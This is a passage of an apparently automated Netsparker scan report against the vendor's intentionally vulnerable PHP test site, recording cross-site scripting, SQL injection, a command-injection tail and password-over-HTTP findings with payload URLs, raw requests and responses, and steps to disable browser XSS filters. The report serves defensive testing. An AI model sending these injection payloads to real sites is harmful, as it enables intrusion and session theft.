		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Products &lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;
                    &lt;form action=&quot;/nslookup.php&quot; method=&quot;POST&quot;&gt;
                           &lt;table class=&quot;databases&quot;&gt;
            &lt;tr&gt;
                &lt;td colspan=&quot;3&quot;&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=&quot;label&quot; style=&quot;width: 89px&quot;&gt;
                    &lt;label&gt;IP Adress:&lt;/label&gt;&lt;/td&gt;
                &lt;td class=&quot;style3&quot;&gt;
                    &lt;input type=&quot;text&quot; size=&quot;40&quot; name=&quot;param&quot; id=&quot;param&quot; class=&quot;input&quot;/&gt;
                &lt;/td&gt;
                &lt;td class=&quot;style1&quot;&gt;
                    &lt;input type=&quot;submit&quot; value=&quot;GO&quot; class=&quot;button&quot; id=&quot;submit&quot;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC>31</WASC>
							<CWE>78</CWE>
							<CAPEC>88</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H</vector>

									<score>
										<type>Base</type>
										<value>9.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>9.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>9.0</value>
										<severity>Critical</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/hello.php?name=%3cscRipt%3enetsparker(0x0003CC)%3c%2fscRipt%3e</url>
					<type>Xss</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected cross-site scripting, which allows an attacker to execute a dynamic script (&lt;em&gt;JavaScript, VBScript&lt;/em&gt;) in the context of the application.&lt;/p&gt;&lt;p&gt;This allows several different attack opportunities, mostly hijacking the current session of the user or changing the look of the page by changing the HTML on the fly to steal the user&#39;s credentials. This happens because the input entered by a user has been interpreted as HTML/JavaScript/VBScript by the browser. Cross-site scripting targets the users of the application instead of the server. Although this is a limitation, since it allows attackers to hijack other users&#39; sessions, an attacker might attack an administrator to gain full control over the application.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;There are many different attacks that can be leveraged through the use of cross-site scripting, including:&lt;ul&gt;&lt;li&gt;Hijacking user&#39;s active session.&lt;/li&gt;&lt;li&gt;Mounting phishing attacks.&lt;/li&gt;&lt;li&gt;Intercepting data and performing man-in-the-middle attacks.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;The issue occurs because the browser interprets the input as active HTML, JavaScript or VBScript. To avoid this, output should be encoded according to the output location and context. For example, if the output goes in to a JavaScript block within the HTML document, then output needs to be encoded accordingly. Encoding can get very complex, therefore it&#39;s strongly recommended to use an encoding library such as &lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API&quot; data-mce-href=&quot;https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API&quot;&gt;OWASP ESAPI&lt;/a&gt; and &lt;a href=&quot;http://www.microsoft.com/en-us/download/details.aspx?id=28589&quot; data-mce-href=&quot;http://www.microsoft.com/en-us/download/details.aspx?id=28589&quot;&gt;Microsoft Anti-cross-site scripting&lt;/a&gt;.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross_site_scripting&#39;&gt;OWASP - cross-site scripting&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/&#39;&gt;Cross-site Scripting Web Application Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://labs.portcullis.co.uk/tools/xss-shell/&#39;&gt;XSS Shell&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://labs.portcullis.co.uk/tools/xss-tunnel/&#39;&gt;XSS Tunnelling&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.microsoft.com/en-us/download/details.aspx?id=28589&#39;&gt;Microsoft Anti-XSS Library&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet&#39;&gt;OWASP XSS Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/AntiSamy&#39;&gt;OWASP AntiSamy Java&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[ &lt;div&gt;&lt;p&gt;Generated XSS exploit might not work due to browser XSS filtering. Please follow the guidelines below in order to disable XSS filtering for different browsers. Also note that;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;XSS filtering is a feature that&#39;s enabled by default in some of the modern browsers. It should only be disabled temporarily to test exploits and should be reverted back if the browser is actively used other than testing purposes.&lt;/li&gt;&lt;li&gt;Even though browsers have certain checks to prevent Cross-site scripting attacks in practice there are a variety of ways to bypass this mechanism therefore a web application should not rely on this kind of client-side browser checks.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Chrome&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Open command prompt.&lt;/li&gt;&lt;li&gt;Go to folder where chrome.exe is located.&lt;/li&gt;&lt;li&gt;Run the command &lt;code&gt;chrome.exe --args --disable-xss-auditor&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Internet Explorer&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Click Tools-&amp;gt;Internet Options and then navigate to the Security Tab.&lt;/li&gt;&lt;li&gt;Click Custom level and scroll towards the bottom where you will find that Enable XSS filter is currently Enabled.&lt;/li&gt;&lt;li&gt;Set it to disabled. Click OK.&lt;/li&gt;&lt;li&gt;Click Yes to accept the warning followed by Apply.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Firefox&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Go to &lt;code&gt;about:config&lt;/code&gt; in the URL address bar.&lt;/li&gt;&lt;li&gt;In the search field, type &lt;em&gt;urlbar.filter&lt;/em&gt; and find &lt;em&gt;browser.urlbar.filter.javascript&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;Set its value to &lt;code&gt;false&lt;/code&gt; by double clicking the row.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>name</vulnerableparameter>
						<vulnerableparametervalue>&amp;lt;scRipt&amp;gt;netsparker(0x0003CC)&amp;lt;/scRipt&amp;gt;</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /hello.php?name=%3cscRipt%3enetsparker(0x0003CC)%3c%2fscRipt%3e HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Hello Visitor&lt;br /&gt;
&lt;b&gt;Parse error&lt;/b&gt;:  syntax error, unexpected &#39;&gt;&#39; in &lt;b&gt;C:\AppServ\www\hello.php(24) : eval()&#39;d code&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;
20$str = 20 &lt;span class=&quot;highlight&quot;&gt;&lt;scRipt&gt;netsparker(0x0003CC)&lt;/scRipt&gt;&lt;/span&gt;;20                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;


				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content -
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A3</OWASP2013>
							<WASC>8</WASC>
							<CWE>79</CWE>
							<CAPEC>19</CAPEC>
							<PCI31>6.5.7</PCI31>
							<PCI32>6.5.7</PCI32>
							<HIPAA>164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>7.4</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>7.4</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>7.4</value>
										<severity>High</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/products.php?pro=&amp;apos;%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0004CB)%3C/scRipt%3E</url>
					<type>Xss</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected cross-site scripting, which allows an attacker to execute a dynamic script (&lt;em&gt;JavaScript, VBScript&lt;/em&gt;) in the context of the application.&lt;/p&gt;&lt;p&gt;This allows several different attack opportunities, mostly hijacking the current session of the user or changing the look of the page by changing the HTML on the fly to steal the user&#39;s credentials. This happens because the input entered by a user has been interpreted as HTML/JavaScript/VBScript by the browser. Cross-site scripting targets the users of the application instead of the server. Although this is a limitation, since it allows attackers to hijack other users&#39; sessions, an attacker might attack an administrator to gain full control over the application.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;There are many different attacks that can be leveraged through the use of cross-site scripting, including:&lt;ul&gt;&lt;li&gt;Hijacking user&#39;s active session.&lt;/li&gt;&lt;li&gt;Mounting phishing attacks.&lt;/li&gt;&lt;li&gt;Intercepting data and performing man-in-the-middle attacks.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;The issue occurs because the browser interprets the input as active HTML, JavaScript or VBScript. To avoid this, output should be encoded according to the output location and context. For example, if the output goes in to a JavaScript block within the HTML document, then output needs to be encoded accordingly. Encoding can get very complex, therefore it&#39;s strongly recommended to use an encoding library such as &lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API&quot; data-mce-href=&quot;https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API&quot;&gt;OWASP ESAPI&lt;/a&gt; and &lt;a href=&quot;http://www.microsoft.com/en-us/download/details.aspx?id=28589&quot; data-mce-href=&quot;http://www.microsoft.com/en-us/download/details.aspx?id=28589&quot;&gt;Microsoft Anti-cross-site scripting&lt;/a&gt;.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross_site_scripting&#39;&gt;OWASP - cross-site scripting&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/&#39;&gt;Cross-site Scripting Web Application Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://labs.portcullis.co.uk/tools/xss-shell/&#39;&gt;XSS Shell&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://labs.portcullis.co.uk/tools/xss-tunnel/&#39;&gt;XSS Tunnelling&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.microsoft.com/en-us/download/details.aspx?id=28589&#39;&gt;Microsoft Anti-XSS Library&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet&#39;&gt;OWASP XSS Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/AntiSamy&#39;&gt;OWASP AntiSamy Java&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[ &lt;div&gt;&lt;p&gt;Generated XSS exploit might not work due to browser XSS filtering. Please follow the guidelines below in order to disable XSS filtering for different browsers. Also note that;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;XSS filtering is a feature that&#39;s enabled by default in some of the modern browsers. It should only be disabled temporarily to test exploits and should be reverted back if the browser is actively used other than testing purposes.&lt;/li&gt;&lt;li&gt;Even though browsers have certain checks to prevent Cross-site scripting attacks in practice there are a variety of ways to bypass this mechanism therefore a web application should not rely on this kind of client-side browser checks.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Chrome&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Open command prompt.&lt;/li&gt;&lt;li&gt;Go to folder where chrome.exe is located.&lt;/li&gt;&lt;li&gt;Run the command &lt;code&gt;chrome.exe --args --disable-xss-auditor&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Internet Explorer&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Click Tools-&amp;gt;Internet Options and then navigate to the Security Tab.&lt;/li&gt;&lt;li&gt;Click Custom level and scroll towards the bottom where you will find that Enable XSS filter is currently Enabled.&lt;/li&gt;&lt;li&gt;Set it to disabled. Click OK.&lt;/li&gt;&lt;li&gt;Click Yes to accept the warning followed by Apply.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Firefox&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Go to &lt;code&gt;about:config&lt;/code&gt; in the URL address bar.&lt;/li&gt;&lt;li&gt;In the search field, type &lt;em&gt;urlbar.filter&lt;/em&gt; and find &lt;em&gt;browser.urlbar.filter.javascript&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;Set its value to &lt;code&gt;false&lt;/code&gt; by double clicking the row.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>pro</vulnerableparameter>
						<vulnerableparametervalue>&amp;apos;&amp;quot;--&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/scRipt&amp;gt;&amp;lt;scRipt&amp;gt;netsparker(0x0004CB)&amp;lt;/scRipt&amp;gt;</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /products.php?pro=&#39;%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0004CB)%3C/scRipt%3E HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;nt=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;script type=text/javascript src = &quot;&lt;span class=&quot;highlight&quot;&gt;&#39;&quot;--&gt;&lt;/style&gt;&lt;/scRipt&gt;&lt;scRipt&gt;netsparker(0x0004CB)&lt;/scRipt&gt;&lt;/span&gt;&quot; &gt;&lt;/script&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Proof URL">&lt;![CDATA[http://php.testsparker.com/products.php?pro=&#39;%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x0004CB)%3C/scRipt%3E]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A3</OWASP2013>
							<WASC>8</WASC>
							<CWE>79</CWE>
							<CAPEC>19</CAPEC>
							<PCI31>6.5.7</PCI31>
							<PCI32>6.5.7</PCI32>
							<HIPAA>164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>7.4</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>7.4</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>7.4</value>
										<severity>High</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/auth/login.php</url>
					<type>PasswordOverHttp</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected that password data is being transmitted over HTTP.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;If an attacker can intercept network traffic, he/she can steal users&#39; credentials.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;See the remedy for solution.&lt;/li&gt;&lt;li&gt;Move all of your critical forms and pages to HTTPS and do not serve them over HTTP.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;All sensitive data should be transferred over HTTPS rather than HTTP. Forms should be served over HTTPS. All aspects of the application that accept user input, starting from the login process, should only be served over HTTPS.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /auth/login.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/auth/
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be; path=/
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Pragma: no-cache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Content-Length: 3117
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:56 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;../process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;../hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;../products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;../process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;../process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
								&lt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Login Area&lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Enter your credentials (admin / admin123456)
    &lt;br/&gt;
    &lt;form method=&quot;POST&quot; action=&quot;control.php&quot;&gt;
      Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;
      &lt;br/&gt;
      Password:&amp;nbsp;&amp;nbsp;&lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt;
&lt;!-- Test credentials --&gt;
&lt;!-- Password: admin123456 --&gt;
      &lt;br/&gt;
      &lt;br/&gt;
      &lt;input type=&quot;submit&quot; value=&quot;SUBMIT&quot;&gt;
    &lt;/form&gt;
                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;d
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Input Name">&lt;![CDATA[password]]&gt;</info>
							<info name="Form target action">&lt;![CDATA[http://php.testsparker.com/auth/control.php]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A6</OWASP2013>
							<WASC>4</WASC>
							<CWE>319</CWE>
							<CAPEC>65</CAPEC>
							<PCI31>6.5.4</PCI31>
							<PCI32>6.5.4</PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>5.7</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>5.7</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>5.7</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/artist.php?id=1%20OR%2017-7%3d10</url>
					<type>DbConnectedAsAdmin</type>
					<severity>High</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected the database user has admin privileges.&lt;/p&gt;&lt;p&gt;This issue has been &lt;strong&gt;confirmed&lt;/strong&gt; by checking the connection privileges via an identified SQL injection vulnerability in the application.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;This can allow an attacker to gain extra privileges via SQL injection attacks. Here is the list of attacks that the attacker might carry out:&lt;ul&gt;&lt;li&gt;Gain full access to the database server.&lt;/li&gt;&lt;li&gt;Gain a reverse shell to the database server and execute commands on the underlying operating system.&lt;/li&gt;&lt;li&gt;Access the database with full permissions, where it may be possible to read, update or delete arbitrary data from the database.&lt;/li&gt;&lt;li&gt;Depending on the platform and the database system user, an attacker might carry out a privilege escalation attack to gain administrator access to the target system.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Create a database user with the least possible permissions for your application and connect to the database with that user. Always follow the principle of providing the least privileges for all users and applications.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/bb669084.aspx&#39;&gt;Authorization and Permissions in SQL Server (ADO.NET)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://en.wikipedia.org/wiki/Principle_of_least_privilege&#39;&gt;Wikipedia - Principle of Least Privilege&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://www.mysqltutorial.org/mysql-grant.aspx&#39;&gt;How to Use MySQL GRANT to Grant Privileges to Account&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /artist.php?id=1%20OR%2017-7%3d10 HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Type: text/html
Transfer-Encoding: chunked
Date: Fri, 29 Jun 2018 03:11:30 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
